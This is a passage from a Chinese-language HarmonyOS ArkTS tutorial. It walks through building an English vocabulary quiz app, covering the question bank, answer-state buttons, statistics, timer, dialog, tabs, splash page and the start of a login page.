\"\u70df\u96fe\", \"\u95ea\u7535\"],\n    answer: \"\u706b\u7130\",\n    sentence: \"The campfire warmed us on a chilly evening.\"\n  },\n  {\n    word: \"friend\",\n    options: [\"\u964c\u751f\u4eba\", \"\u90bb\u5c45\", \"\u5bb6\u4eba\", \"\u670b\u53cb\"],\n    answer: \"\u670b\u53cb\",\n    sentence: \"A true friend is always there for you.\"\n  },\n  {\n    word: \"food\",\n    options: [\"\u6c34\u679c\", \"\u852c\u83dc\", \"\u8089\", \"\u98df\u7269\"],\n    answer: \"\u98df\u7269\",\n    sentence: \"Healthy food is essential for a balanced diet.\"\n  },\n  {\n    word: \"color\",\n    options: [\"\u9ed1\u8272\", \"\u767d\u8272\", \"\u7ea2\u8272\", \"\u989c\u8272\"],\n    answer: \"\u989c\u8272\",\n    sentence: \"The artist used a vibrant color palette.\"\n  },\n  {\n    word: \"bookshelf\",\n    options: [\"\u6905\u5b50\", \"\u684c\u5b50\", \"\u4e66\u67b6\", \"\u5e8a\"],\n    answer: \"\u4e66\u67b6\",\n    sentence: \"The bookshelf is filled with novels and reference books.\"\n  },\n  {\n    word: \"moon\",\n    options: [\"\u592a\u9633\", \"\u661f\u661f\", \"\u6708\u4eae\", \"\u5730\u7403\"],\n    answer: \"\u6708\u4eae\",\n    sentence: \"The moonlight illuminated the night sky.\"\n  },\n  {\n    word: \"school\",\n    options: [\"\u516c\u56ed\", \"\u5546\u5e97\", \"\u533b\u9662\", \"\u5b66\u6821\"],\n    answer: \"\u5b66\u6821\",\n    sentence: \"Students go to school to learn and grow.\"\n  },\n  {\n    word: \"shoes\",\n    options: [\"\u5e3d\u5b50\", \"\u8863\u670d\", \"\u88e4\u5b50\", \"\u978b\u5b50\"],\n    answer: \"\u978b\u5b50\",\n    sentence: \"She bought a new pair of stylish shoes.\"\n  },\n  {\n    word: \"camera\",\n    options: [\"\u7535\u89c6\", \"\u7535\u8111\", \"\u76f8\u673a\", \"\u624b\u673a\"],\n    answer: \"\u76f8\u673a\",\n    sentence: \"The photographer captured the moment with his camera.\"\n  }\n]\n\n//\u4ece\u9898\u5e93\u4e2d\u968f\u673a\u62bd\u53d6n\u4e2a\u9898\u76ee\nexport function getRandomQuestions(count: number) {\n  let length = questionData.length;\n\n  let indexes: number[] = [];\n  while (indexes.length &lt; count) {\n    let index = Math.floor(Math.random() * length);\n    if (!indexes.includes(index)) {\n      indexes.push(index)\n    }\n  }\n  return indexes.map(index =&gt; questionData[index])\n}\n</code></pre> <p>\u6ce8\u610f\uff1a\u5207\u6362\u9898\u76ee\u65f6\u9700\u8981\u8003\u8651\u5ef6\u65f6\u5207\u6362\uff0c\u5e76\u4e14\u5728\u5ef6\u65f6\u7684\u8fd9\u6bb5\u65f6\u95f4\u5185\uff0c\u9009\u9879\u6309\u94ae\u5e94\u8be5\u5904\u5728\u4e0d\u53ef\u7528\u7684\u72b6\u6001\u3002</p>"},{"location":"JS/test/#2224","title":"2.2.2.4. \u5224\u65ad\u6b63\u8bef","text":"<p>\u5224\u65ad\u6b63\u8bef\u7684\u903b\u8f91\u76f8\u5bf9\u6bd4\u8f83\u590d\u6742\uff0c\u4e0b\u9762\u9010\u6b65\u5b9e\u73b0</p> <p>\u7b2c\u4e00\u6b65\uff1a\u81ea\u5b9a\u4e49\u9009\u9879\u6309\u94ae\u7ec4\u4ef6</p> <p>\u4f5c\u7b54\u6b63\u786e\u4e0e\u5426\u9700\u8981\u901a\u8fc7\u9009\u9879\u6309\u94ae\u7684\u6837\u5f0f\u6765\u4f53\u73b0\uff0c\u6574\u4f53\u6765\u770b\u9009\u9879\u6309\u94ae\u5171\u6709\u4e09\u79cd\u6837\u5f0f\uff0c\u5982\u4e0b\u56fe\u6240\u793a</p> \u72b6\u6001 \u9ed8\u8ba4 \u6b63\u786e \u9519\u8bef \u6548\u679c \u6309\u94ae\u6837\u5f0f\u53c2\u8003 \u80cc\u666f\u989c\u8272\uff1a<code>Color.White</code>\u5b57\u4f53\u989c\u8272\uff1a<code>Color.Black</code> \u80cc\u666f\u989c\u8272\uff1a<code>#1DBF7B</code>\u5b57\u4f53\u989c\u8272\uff1a<code>Color.White</code> \u80cc\u666f\u989c\u8272\uff1a<code>#FA635F</code>\u5b57\u4f53\u989c\u8272\uff1a<code>Color.White</code> \u56fe\u6807\u6837\u5f0f\u53c2\u8003 <code>.width(22) .height(22)</code> <code>.width(22) .height(22)</code> <p>\u8003\u8651\u5230\u4e0a\u8ff0\u7684\u591a\u79cd\u6837\u5f0f\uff0c\u53ef\u4ee5\u5c06\u9009\u9879\u6309\u94ae\u62bd\u53d6\u4e3a\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7ec4\u4ef6\uff0c\u5e76\u5b9a\u4e49\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf\u6765\u63a7\u5236\u6309\u94ae\u7684\u6837\u5f0f\uff0c\u72b6\u6001\u53d8\u91cf\u7684\u7c7b\u578b\u53ef\u4f7f\u7528\u5982\u4e0b\u679a\u4e3e\u7c7b\u578b</p> <pre><code>export enum OptionStatus {\n  Default, //\u9ed8\u8ba4\u72b6\u6001\n  Right, //\u6b63\u786e\u72b6\u6001\n  Wrong //\u9519\u8bef\u72b6\u6001\n}\n</code></pre> <p>\u8fd9\u6837\u4e00\u6765\uff0c\u7b54\u5b8c\u4e00\u9053\u9898\u76ee\u540e\uff0c\u6211\u4eec\u53ea\u9700\u4fee\u6539\u4e0a\u8ff0\u72b6\u6001\u53d8\u91cf\uff0c\u6309\u94ae\u5c31\u80fd\u5448\u73b0\u51fa\u5bf9\u5e94\u7684\u6837\u5f0f\u4e86\u3002</p> <p>\u7b2c\u4e8c\u6b65\uff1a\u5b9e\u73b0\u4fee\u6539\u6309\u94ae\u72b6\u6001\u7684\u903b\u8f91</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6bcf\u6b21\u5207\u6362\u9898\u76ee\u540e\uff0cForEach\u6e32\u67d3\u7684\u9009\u9879\u6309\u94ae\u90fd\u4f1a\u91cd\u5efa\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8003\u8651\u9009\u9879\u6309\u94ae\u5982\u4f55\u4ece\u9ed8\u8ba4\u7684Default\u72b6\u6001\u5207\u5230Right\u6216\u8005Wrong\u5373\u53ef\u3002</p> <p>\u6ce8\u610f\uff1a</p> <p>\u82e5\u524d\u540e\u4e24\u9053\u9898\u76ee\u7684options\u6570\u7ec4\u4e2d\u7684\u9009\u9879\u6709\u91cd\u5408\uff0c\u6309\u7167ForEach\u5c3d\u91cf\u590d\u7528\u539f\u6709\u7ec4\u4ef6\u7684\u539f\u5219\uff0c\u90a3\u4e48\u6709\u4e9bOptionButton\u7ec4\u4ef6\u5c31\u53ef\u80fd\u4e0d\u4f1a\u91cd\u5efa\uff0c\u6b64\u65f6\u6211\u4eec\u8fd8\u8981\u53bb\u8003\u8651\u5982\u4f55\u5c06\u8fd9\u4e9bOptionButton\u7ec4\u4ef6\u7684\u72b6\u6001\u4ece\u4e0a\u4e00\u9053\u9898\u76ee\u7684Right\u6216\u8005Wrong\u6062\u590d\u4e3aDefault\u3002\u4e3a\u4e86\u7b80\u5316\u903b\u8f91\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06ForEach\u7684keyGenerator\u8bbe\u7f6e\u4e3a</p> <p><code>option =&gt; this.questions[this.currentIndex].word + '-' + option</code>\uff0c\u8fd9\u6837\u5c31\u80fd\u786e\u4fdd\u6bcf\u9053\u9898\u76ee\u7684OptionButton\u90fd\u4f1a\u91cd\u5efa\u3002</p> <p>\u5c06\u6309\u9009\u9879\u6309\u94ae\u4eceDefault\u72b6\u6001\u5207\u6362\u4e3aRight\u6216\u8005Wrong\uff0c\u9700\u8981\u8003\u8651\u5982\u4e0b\u4e24\u4e2a\u95ee\u9898</p> <ol> <li>\u600e\u6837\u89e6\u53d1\u6bcf\u4e2a\u6309\u94ae\u6539\u53d8\u81ea\u8eab\u72b6\u6001\u7684\u64cd\u4f5c</li> <li>\u6bcf\u4e2a\u6309\u94ae\u600e\u6837\u5224\u65ad\u81ea\u8eab\u5e94\u8be5\u53d8\u4e3a\u54ea\u4e2a\u72b6\u6001</li> </ol> <p>\u5177\u4f53\u903b\u8f91\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u8bf4\u660e\uff1a</p> <ol> <li>\u5b50\u7ec4\u4ef6\u4e2d\u7684<code>option</code>\u548c<code>answer</code>\u5206\u522b\u8868\u793a\u9009\u9879\u548c\u6b63\u786e\u7b54\u6848\uff0c\u56e0\u6b64\u5b50\u7ec4\u4ef6\u53ef\u6839\u636e\u8fd9\u4e24\u4e2a\u53d8\u91cf\u5224\u65ad\u81ea\u8eab\u662f\u5426\u662f\u6b63\u786e\u7b54\u6848\u3002</li> <li>\u7236\u7ec4\u4ef6\u4e2d\u7684<code>@State selectedOption</code>\u53d8\u91cf\u7528\u4e8e\u8bb0\u5f55\u5f53\u524d\u9009\u62e9\u7684\u9009\u9879\uff0c\u5b50\u7ec4\u4ef6\u4e2d\u7684<code>@Prop selectedOption</code>\u4f1a\u540c\u6b65\u7236\u7ec4\u4ef6\u7684\u53d8\u5316\uff0c\u56e0\u6b64\u5b50\u7ec4\u4ef6\u53ef\u6839\u636e<code>option</code>\u548c<code>selectedOption</code>\u5224\u65ad\u81ea\u8eab\u662f\u5426\u662f\u88ab\u9009\u7b54\u6848\u3002</li> <li><code>answerStatus</code>\u53d8\u91cf\u8868\u793a\u5f53\u524d\u9898\u76ee\u7684\u4f5c\u7b54\u72b6\u6001\uff0c\u4f5c\u7b54\u72b6\u6001\u5171\u6709\u4e24\u4e2a\uff0c\u5206\u522b\u662f<code>AnswerStatus.Answering</code>\u548c<code>AnswerStatus.Answered</code>\u3002\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u4f5c\u7b54\u72b6\u6001\u90fd\u662f<code>AnswerStatus.Answering</code>\uff0c\u4f5c\u7b54\u540e\u4f1a\u53d8\u4e3a<code>AnswerStatus.Answered</code>\u3002\u7236\u7ec4\u4ef6\u6839\u636e<code>answerStatus</code>\u53d8\u91cf\u63a7\u5236\u9009\u9879\u6309\u94ae\u662f\u5426\u53ef\u7528\uff0c\u5b50\u7ec4\u4ef6\u901a\u8fc7\u76d1\u542c<code>answerStatus</code>\u7684\u53d8\u5316\u6765\u89e6\u53d1\u4fee\u6539<code>optionStatus</code>\u7684\u64cd\u4f5c\u3002</li> </ol>"},{"location":"JS/test/#2225","title":"2.2.2.5. \u7edf\u8ba1\u4fe1\u606f","text":"<p>\u7531\u4e8e\u5404\u9879\u7edf\u8ba1\u4fe1\u606f\u7684\u7ed3\u6784\u76f8\u4f3c\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u5c06\u7edf\u8ba1\u4fe1\u606f\u4e5f\u62bd\u53d6\u4e3a\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7ec4\u4ef6\uff0c\u7ec4\u4ef6\u5e94\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u56fe\u6807\u3001\u540d\u79f0\u548c\u4e00\u4e2aUI\u7ec4\u4ef6</p> <p></p> <p>\u6ce8\u610f\uff1aUI\u7ec4\u4ef6\u53c2\u6570\u9700\u4f7f\u7528@BuilderParam\u88c5\u9970</p> <p>\u8003\u8651\u5230\u540e\u5e8f\u6253\u5361\u5708\u9700\u8981\u7528\u5230\u7edf\u8ba1\u4fe1\u606f\uff0c\u4f46\u5b57\u4f53\u989c\u8272\u4e0d\u540c\uff0c\u56e0\u6b64\u53ef\u4ee5\u518d\u589e\u52a0\u4e00\u4e2a\u53c2\u6570\u2014\u2014\u5b57\u4f53\u989c\u8272</p> <p></p> <p>\u7ec4\u4ef6\u6837\u5f0f\u53ef\u53c2\u8003\u4e0b\u8868</p> \u6548\u679c\uff08\u4ee5\u51c6\u786e\u7387\u4e3a\u4f8b\uff09 \u5bb9\u5668\u6837\u5f0f\u53c2\u8003 <code>.width('100%') .height(30)</code> \u56fe\u6807\u6837\u5f0f\u53c2\u8003 <code>.height(14) .width(14)</code> \u540d\u79f0\u6837\u5f0f\u53c2\u8003 <code>.fontWeight(FontWeight.Medium) .fontSize(14) .fontColor(this.fontColor)</code>"},{"location":"JS/test/#22251","title":"2.2.2.5.1. \u51c6\u786e\u7387","text":"<p>\u4e3a\u7edf\u8ba1\u51c6\u786e\u7387\uff0c\u9700\u8981\u5b9a\u4e49<code>answeredCount</code>\u548c<code>rightCount</code>\u4e24\u4e2a\u72b6\u6001\u53d8\u91cf\uff0c<code>answeredCount</code>\u8868\u793a\u672c\u8f6e\u6d4b\u8bd5\u5df2\u4f5c\u7b54\u4e2a\u6570\uff0c<code>rightCount</code>\u8868\u793a\u6b63\u786e\u4e2a\u6570\uff0c\u5e76\u5728\u6bcf\u6b21\u4f5c\u7b54\u540e\uff0c\u66f4\u65b0\u4e0a\u8ff0\u53d8\u91cf\u3002</p>"},{"location":"JS/test/#22252","title":"2.2.2.5.2. \u8fdb\u5ea6","text":"<p>\u8fdb\u5ea6\u7684\u7edf\u8ba1\u9700\u8981\u7528\u5230<code>totalCount</code>\u548c<code>answeredCount</code>\u4e24\u4e2a\u72b6\u6001\u53d8\u91cf\uff0c\u5e76\u901a\u8fc7\u8fdb\u5ea6\u6761\u7ec4\u4ef6Progress\u5448\u73b0\u3002</p>"},{"location":"JS/test/#22253","title":"2.2.2.5.3. \u4e2a\u6570","text":"<p>\u4e2a\u6570\u901a\u8fc7\u4e00\u4e2a\u6309\u94ae\u7ec4\u4ef6Button\u5448\u73b0\uff0c\u70b9\u51fb\u8be5\u6309\u94ae\u65f6\uff0c\u9700\u8981\u5f39\u51fa\u6587\u672c\u9009\u62e9\u5668\uff0c\u9009\u62e9\u4e0b\u4e00\u8f6e\u6d4b\u8bd5\u7684\u5355\u8bcd\u4e2a\u6570\uff0c\u9009\u62e9\u540e\u9700\u8981\u91cd\u65b0\u62c9\u53d6\u6307\u5b9a\u4e2a\u6570\u7684\u9898\u76ee\u3002\u6309\u94ae\u7684\u6837\u5f0f\u53ef\u53c2\u8003\u4e0b\u8868</p> \u6837\u5f0f \u6548\u679c <code>.width(100) .height(25) .backgroundColor('#EBEBEB') .fontColor(Color.Black)</code> <p>\u6ce8\u610f\uff1a\u53ea\u6709\u505c\u6b62\u72b6\u6001\u4e0b\u624d\u53ef\u4fee\u6539\u9898\u76ee\u4e2a\u6570</p>"},{"location":"JS/test/#22254","title":"2.2.2.5.4. \u7528\u65f6","text":"<p>\u8ba1\u65f6\u5668\u9700\u8981\u7528\u5230TextTimer\u7ec4\u4ef6\uff0c\u8be5\u7ec4\u4ef6\u7684\u7528\u6cd5\u5982\u4e0b</p> <p>1.\u53c2\u6570</p> <p>TextTimer\u9700\u8981\u4f20\u5165\u4e00\u4e2a<code>controller</code>\u53c2\u6570\uff0c\u7528\u4e8e\u63a7\u5236\u8ba1\u65f6\u5668\u7684\u542f\u52a8\u3001\u6682\u505c\u548c\u91cd\u7f6e\uff0c\u5177\u4f53\u7528\u6cd5\u5982\u4e0b</p> <pre><code>//controller\u58f0\u660e\ntimerController: TextTimerController = new TextTimerController();\n\n//\u7ec4\u4ef6\u58f0\u660e\nTextTimer({ controller: this.timerController })\n\n//\u542f\u52a8\u8ba1\u65f6\u5668\nthis.timerController.start()\n//\u6682\u505c\u8ba1\u65f6\u5668\nthis.timerController.pause()\n//\u91cd\u7f6e\u8ba1\u65f6\u5668\nthis.timerController.reset()\n</code></pre> <p>2.\u4e8b\u4ef6</p> <p>TextTimer\u7684\u5e38\u7528\u4e8b\u4ef6\u4e3a<code>onTimer</code>\uff0c\u53ea\u8981\u8ba1\u65f6\u5668\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\uff0c\u56e0\u6b64\u53ef\u7528\u8be5\u4e8b\u4ef6\u8bb0\u5f55\u7528\u65f6\u3002\u8be5\u65b9\u6cd5\u63a5\u6536\u7684\u56de\u8c03\u51fd\u6570\u5b9a\u4e49\u5982\u4e0b</p> <pre><code>(utc: number, elapsedTime: number) =&gt; void\n</code></pre> <p>\u5176\u4e2d<code>utc</code>\u8868\u793a\u5f53\u524d\u7684\u65f6\u95f4\u6233\uff0c<code>elapsedTime</code>\u8868\u793a\u81ea\u8ba1\u65f6\u5668\u5f00\u59cb\u4ee5\u6765\u6240\u7ecf\u8fc7\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u6beb\u79d2\u3002</p>"},{"location":"JS/test/#2226","title":"2.2.2.6. \u5f39\u7a97","text":"<p>\u5f39\u7a97\u7684\u4f5c\u7528\u662f\u5c55\u793a\u7edf\u8ba1\u4fe1\u606f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4e3a\u5f39\u7a97\u5b9a\u4e49\u4e09\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f<code>answeredCount</code>\u3001<code>rightCount</code>\u3001<code>timeUsed</code>\u3002</p> <p>\u5f39\u7a97\u7684\u5e03\u5c40\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u5f39\u7a97\u5185\u7ec4\u4ef6\u7684\u6837\u5f0f\u53ef\u53c2\u8003\u4e0b\u8868</p> \u7ec4\u4ef6 \u6837\u5f0f \u6548\u679c \u5916\u5c42\u5bb9\u5668 <code>.backgroundColor(Color.Transparent) .width('80%')</code> \u5173\u95ed\u6309\u94ae <code>.width(25) .height(25) .alignSelf(ItemAlign.End)</code> \u5185\u5c42\u5bb9\u5668 <code>.backgroundColor(Color.White) .width('100%') .padding(20) .borderRadius(10)</code> \u56fe\u7247 <code>.width('100%') .borderRadius(10)</code> <p>\u6ce8\u610f\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6240\u6709\u5f39\u7a97\u90fd\u4f7f\u7528\u9ed8\u8ba4\u7684\u6837\u5f0f\uff0c\u5982\u9700\u4f7f\u7528\u81ea\u5b9a\u4e49\u6837\u5f0f\uff0c\u9700\u8981\u4e3aCustomDialogController\u914d\u7f6e<code>customStyle:true</code>\u53c2\u6570\u3002</p> <p>\u65f6\u95f4\u683c\u5f0f\u8f6c\u6362\u903b\u8f91\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> <pre><code>export function convertMillisecondsToTime(timeUsed: number): string {\n  // \u8ba1\u7b97\u5c0f\u65f6\u3001\u5206\u949f\u548c\u79d2\n  const hours = Math.floor(timeUsed / 3600000); // 1\u5c0f\u65f6 = 3600000\u6beb\u79d2\n  const minutes = Math.floor((timeUsed % 3600000) / 60000); // 1\u5206\u949f = 60000\u6beb\u79d2\n  const seconds = Math.floor((timeUsed % 60000) / 1000); // 1\u79d2 = 1000\u6beb\u79d2\n\n  // \u5c06\u7ed3\u679c\u683c\u5f0f\u5316\u4e3a\u65f6\u5206\u79d2\u5b57\u7b26\u4e32\n  if (hours &gt; 0) {\n    return `${hours}\u65f6  ${minutes}\u5206 ${seconds}\u79d2`\n  } else if (minutes &gt; 0) {\n    return `${minutes}\u5206 ${seconds}\u79d2`\n  } else {\n    return `${seconds}\u79d2`\n  }\n}\n</code></pre> <p>\u5f39\u7a97\u7684\u4ea4\u4e92\u903b\u8f91\u662f\uff1a</p> <p>\u70b9\u51fb\u5173\u95ed\u6309\u94ae\uff0c\u5173\u95ed\u5f39\u7a97\u5e76\u91cd\u7f6e\u9898\u76ee\u548c\u7edf\u8ba1\u4fe1\u606f</p> <p>\u70b9\u51fb\u518d\u6765\u4e00\u5c40\uff0c\u5173\u95ed\u5f39\u7a97\u5e76\u91cd\u7f6e\u9898\u76ee\u548c\u7edf\u8ba1\u4fe1\u606f\uff0c\u7136\u540e\u76f4\u63a5\u5f00\u59cb\u6d4b\u8bd5</p> <p>\u70b9\u51fb\u767b\u5f55\u6253\u5361\uff0c\u5173\u95ed\u5f39\u7a97\u5e76\u91cd\u7f6e\u9898\u76ee\u548c\u7edf\u8ba1\u4fe1\u606f\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u767b\u5f55\u9875\u9762\uff0c\u8fd9\u90e8\u5206\u529f\u80fd\u540e\u8fb9\u518d\u8fdb\u884c\u5b9e\u73b0\u3002</p>"},{"location":"JS/test/#3-tab","title":"3. Tab\u5e03\u5c40","text":""},{"location":"JS/test/#31","title":"3.1. \u6982\u8ff0","text":"<p>\u672c\u8282\u8981\u5b8c\u6210\u7684\u5185\u5bb9\u662fTab\u5e03\u5c40\uff0c\u5177\u4f53\u6548\u679c\u5982\u4e0b</p> <p></p>"},{"location":"JS/test/#32","title":"3.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#321","title":"3.2.1. \u6240\u9700\u6280\u80fd","text":"<p>\u5b9e\u73b0\u4e0a\u8ff0\u6548\u679c\u9700\u8981\u7528\u5230\u4ee5\u4e0b\u6280\u80fd</p> <p>Tabs\u7ec4\u4ef6</p> <p>\u4e0a\u8ff0\u5185\u5bb9\u53ef\u53c2\u8003HarmonyOS 4.0 \u5e94\u7528\u5f00\u53d1\u4e2d\u7684\u7b2c7\u7ae0\u3002</p>"},{"location":"JS/test/#322","title":"3.2.2. \u5b9e\u73b0\u8fc7\u7a0b","text":"<p>\u6807\u7b7e\u6837\u5f0f\u53ef\u53c2\u8003\u4e0b\u8868</p> \u7ec4\u4ef6 \u9009\u4e2d\u6548\u679c \u672a\u9009\u4e2d\u6548\u679c \u56fe\u6807 <code>@Styles function tabIconStyle() {  .width(25)  .height(25) }</code> <code>@Styles function tabIconStyle() {  .width(25)  .height(25) }</code> \u6587\u5b57 <code>@Extend(Text) function tabTitleStyle(color: ResourceColor) {  .fontSize(10)  .fontWeight(FontWeight.Medium)  .fontColor(color) //Color.Black  .margin({ bottom: 2 }) }</code> <code>@Extend(Text) function tabTitleStyle(color: ResourceColor) {  .fontSize(10)  .fontWeight(FontWeight.Medium)  .fontColor(color) //#959595  .margin({ bottom: 2 }) }</code>"},{"location":"JS/test/#4","title":"4. \u6b22\u8fce\u9875\u9762","text":""},{"location":"JS/test/#41","title":"4.1. \u6982\u8ff0","text":"<p>\u6b22\u8fce\u9875\u9762\u7684\u529f\u80fd\u76f8\u5bf9\u7b80\u5355\uff0c\u8981\u5b9e\u73b0\u7684\u5177\u4f53\u6548\u679c\u5982\u4e0b</p> <p></p>"},{"location":"JS/test/#42","title":"4.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#421","title":"4.2.1. \u6240\u9700\u6280\u80fd","text":"<p>\u7b54\u9898\u6a21\u5757\u6240\u9700\u6280\u80fd\u5982\u4e0b</p> <ol> <li>\u7ec4\u4ef6\u52a8\u753b\u6548\u679c</li> <li>\u9875\u9762\u8def\u7531</li> <li>\u7ec4\u4ef6\u751f\u547d\u5468\u671f\u94a9\u5b50\u51fd\u6570</li> </ol> <p>\u4e0a\u8ff0\u5185\u5bb9\u53ef\u53c2\u8003HarmonyOS 4.0 \u5e94\u7528\u5f00\u53d1\u4e2d\u7684\u7b2c8\u30019\u300110\u7ae0\u3002</p>"},{"location":"JS/test/#422","title":"4.2.2. \u5b9e\u73b0\u8fc7\u7a0b","text":""},{"location":"JS/test/#4221","title":"4.2.2.1. \u57fa\u672c\u5e03\u5c40\u548c\u6837\u5f0f","text":"<p>\u6b22\u8fce\u9875\u9762\u7684\u57fa\u672c\u5e03\u5c40\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u5404\u7ec4\u4ef6\u6837\u5f0f\u53ef\u53c2\u8003\u4e0b\u8868</p> \u7ec4\u4ef6 \u6837\u5f0f \u6548\u679c \u9875\u9762\u80cc\u666f <code>@Styles function bgStyle() {  .width('100%')  .height('100%')  .backgroundImage($r('app.media.img_splash_bg'))  .backgroundImageSize({ width: '100%', height: '100%' }) }</code> logo <code>@Extend(Image) function logoStyle() {  .width(90)  .height(90)  .margin({ top: 120 }) }</code> \u6807\u9898 <code>@Extend(Text) function titleStyle() {  .fontSize(21)  .fontColor(Color.White)  .fontWeight(FontWeight.Bold)  .margin({ top: 15 }) }</code> \u9875\u811a <code>@Extend(Text) function footerStyle() {  .fontSize(12)  .fontColor('#546B9D')  .fontWeight(FontWeight.Bold)  .margin({ bottom: 30 }) }</code>"},{"location":"JS/test/#4222","title":"4.2.2.2. \u5b9e\u73b0\u52a8\u753b\u6548\u679c","text":"<p>\u8981\u5b9e\u73b0\u7684\u52a8\u753b\u6548\u679c\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u5f88\u660e\u663e\uff0c\u4e0a\u8ff0\u52a8\u753b\u6548\u679c\u53ef\u5f52\u7c7b\u4e3a\u7ec4\u4ef6\u8f6c\u573a\u52a8\u753b\uff0c\u56e0\u6b64\u53ef\u4f7f\u7528<code>transition()</code>\u65b9\u6cd5\u914d\u7f6e\u52a8\u753b\u6548\u679c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0a\u8ff0\u52a8\u753b\u53e0\u52a0\u4e86\u4e24\u4e2a\u8f6c\u573a\u6548\u679c\uff0c\u5206\u522b\u662f\u5e73\u79fb\u548c\u900f\u660e\u5ea6\u3002</p>"},{"location":"JS/test/#4223","title":"4.2.2.3. \u89e6\u53d1\u52a8\u753b\u6548\u679c","text":"<p>\u8981\u6c42\u9875\u9762\u51fa\u73b0\u65f6\u81ea\u52a8\u89e6\u53d1\u52a8\u753b\u6548\u679c\uff0c\u6b64\u65f6\u9700\u8981\u7528\u5230\u7ec4\u4ef6\u751f\u547d\u5468\u671f\u51fd\u6570\uff0c\u8fd9\u91cc\u53ef\u4f7f\u7528<code>onPageShow()</code>\u51fd\u6570\u3002</p>"},{"location":"JS/test/#4224","title":"4.2.2.4. \u9875\u9762\u8df3\u8f6c","text":"<p>\u8981\u6c42\u52a8\u753b\u64ad\u653e\u5b8c\u6bd5\u540e\uff0c\u505c\u7559200ms\u540e\u8df3\u8f6c\u5230\u7b54\u9898\u9875\u9762\uff0c\u6b64\u65f6\u9700\u8981\u7528\u5230\u9875\u9762\u8def\u7531\u529f\u80fd\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u6b22\u8fce\u9875\u662f\u4e0d\u53ef\u8fd4\u56de\u7684\u3002</p>"},{"location":"JS/test/#4225","title":"4.2.2.5. \u6307\u5b9a\u5e94\u7528\u521d\u59cb\u9875\u9762","text":"<p>\u4fee\u6539<code>entry/src/main/ets/entryability/EntryAbility.ts</code>\u6587\u4ef6\u4e2d\u7684\u5982\u4e0b\u5185\u5bb9\uff0c\u6307\u5b9a\u5e94\u7528\u521d\u59cb\u9875\u9762\u4f4d\u6b22\u8fce\u9875</p> <pre><code>onWindowStageCreate(windowStage: window.WindowStage) {\n  // Main window is created, set main page for this ability\n  hilog.info(0x0000, 'testTag', '%{public}s', 'Ability onWindowStageCreate');\n\n  //\u4fee\u6539\u4f4d\u7f6e\n  windowStage.loadContent('pages/SplashPage', (err, data) =&gt; {\n    if (err.code) {\n      hilog.error(0x0000, 'testTag', 'Failed to load the content. Cause: %{public}s', JSON.stringify(err) ?? '');\n      return;\n    }\n    hilog.info(0x0000, 'testTag', 'Succeeded in loading the content. Data: %{public}s', JSON.stringify(data) ?? '');\n  });\n}\n</code></pre> <p>\u8bf4\u660e\uff1a\u8be5\u6587\u4ef6\u7684\u5177\u4f53\u542b\u4e49\u53ef\u53c2\u8003HarmonyOS 4.0 \u5e94\u7528\u5f00\u53d1\u7b2c15\u7ae0</p>"},{"location":"JS/test/#5","title":"5. \u767b\u5f55\u529f\u80fd","text":""},{"location":"JS/test/#51","title":"5.1. \u6982\u8ff0","text":"<p>\u767b\u5f55\u65b9\u5f0f\u4e3a\u624b\u673a\u77ed\u4fe1\u9a8c\u8bc1\u7801\u767b\u5f55\uff0c\u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p>"},{"location":"JS/test/#52","title":"5.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#521","title":"5.2.1. \u6240\u9700\u6280\u80fd","text":"<p>\u767b\u5f55\u529f\u80fd\u6240\u9700\u6280\u80fd\u5982\u4e0b</p> <ol> <li>\u7f51\u7edc\u8bf7\u6c42</li> <li>\u5e94\u7528\u7ea7\u72b6\u6001\u7ba1\u7406</li> </ol> <p>\u4e0a\u8ff0\u5185\u5bb9\u53ef\u53c2\u8003HarmonyOS 4.0 \u5e94\u7528\u5f00\u53d1\u4e2d\u7684\u7b2c12\u300113\u7ae0\u3002</p>"},{"location":"JS/test/#522","title":"5.2.2. \u5b9e\u73b0\u8fc7\u7a0b","text":""},{"location":"JS/test/#5221","title":"5.2.2.1. \u57fa\u672c\u5e03\u5c40\u548c\u6837\u5f0f","text":"<p>\u767b\u5f55\u9875\u9762\u7684\u57fa\u672c\u5e03\u5c40\u548c\u6837\u5f0f\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> <pre><code>import router from '@ohos.router'\n@Entry\n@Component\nstruct LoginPage {\n  @State phone:string=''\n  @State code:string=''\n  build() {\n    Column() {\n      Image($r('app.media.ic_back'))\n        .backStyle()\n        .alignSelf(ItemAlign.Start)\n        .onClick(() =&gt; {\n          //todo:\u8fd4\u56de\u4e0a\u4e00\u9875\u9762\n        })\n\n      Blank()\n      Column() {\n        Text('\u6b22\u8fce\u767b\u5f55')\n          .titleStyle()\n\n        Row() {\n          Image($r(\"app.media.ic_phone\"))\n            .iconStyle()\n          TextInput({ placeholder: '\u8bf7\u8f93\u5165\u624b\u673a\u53f7\u7801',text:this.phone })\n            .inputStyle()\n            .onChange((value)=&gt;{\n              this.phone=value;\n            